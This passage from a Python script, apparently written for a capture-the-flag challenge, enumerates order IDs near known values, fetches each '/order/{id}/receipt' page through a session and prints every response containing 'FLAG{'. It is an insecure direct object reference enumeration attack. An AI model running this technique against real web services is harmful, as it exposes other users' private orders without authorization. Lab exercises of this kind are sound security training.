    for oid in order_ids:
        for delta in range(-5, 6):
            nid = oid + delta
            if nid > 0:
                candidates.add(nid)
    for nid in range(1, 16):
        candidates.add(nid)

    candidates = sorted(candidates)
    print(f'[INFO] Total unique candidate IDs: {len(candidates)}')

    results = []
    flag_bodies = []

    for cid in candidates:
        url = f'{base_url}/order/{cid}/receipt'
        try:
            r = session.get(url)
        except Exception as e:
            print(f'[ERROR] Request to {url} failed: {e}')
            continue
        body = r.text
        has_flag = 'FLAG{' in body
        results.append((cid, r.status_code, has_flag))
        if has_flag:
            print(f'[FLAG-HIT] id={cid} status={r.status_code}')
            print(body)
            flag_bodies.append(body)

    print('[FINAL] Bodies containing FLAG{ substring:')
    for b in flag_bodies:
        print('----- BODY START -----')
        print(b)
        print('----- BODY END -----')

    print('[FINAL] CSV results:')
    print('id,status,flag_found')
    for cid, status, has_flag in results:
        print(f'{cid},{status},{has_flag}')

except Exception as e:
    print(f'[FATAL ERROR] {e}')

